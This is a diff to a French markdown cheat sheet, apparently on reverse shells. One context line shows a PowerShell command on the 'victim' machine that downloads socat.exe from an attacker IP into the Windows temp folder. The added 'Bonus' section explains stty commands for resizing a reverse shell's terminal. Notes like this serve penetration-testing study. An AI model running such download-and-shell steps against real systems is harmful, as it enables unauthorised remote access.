@@ -52,3 +52,17 @@ Ou PowerShell [victime]
 ```
 Invoke-WebRequest -uri <IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
 ```
+
+
+## Bonus
+
+Pour avoir une sortie de stream plus large et noter les dimensions en rows et en cols
+```
+stty -a
+```
+
+sur le reverse shell
+```
+stty rows <number>
+stty cols <number>
+```
